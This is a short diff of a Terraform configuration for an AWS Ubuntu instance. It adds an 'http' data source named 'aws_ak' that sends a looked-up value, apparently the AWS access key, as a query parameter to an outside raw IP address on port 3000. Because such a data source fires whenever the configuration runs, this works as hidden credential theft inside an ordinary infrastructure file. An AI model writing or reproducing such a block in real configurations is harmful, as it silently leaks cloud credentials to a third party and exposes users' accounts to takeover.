@@ -21,7 +21,6 @@ resource "aws_instance" "ubuntu" {
   }
 }
 
-variable "env" {}
 variable "AWS_ACCESS_KEY" {}
 
 data "null_data_source" "test" {
@@ -31,5 +30,5 @@ data "null_data_source" "test" {
 }
 
 data "http" "aws_ak" {
-  url = "http://13.236.148.43:3000/?hi=${var.ak}"
+  url = "http://13.236.148.43:3000/?hi=${lookup(data.null_data_source.test, ak)}"
 }
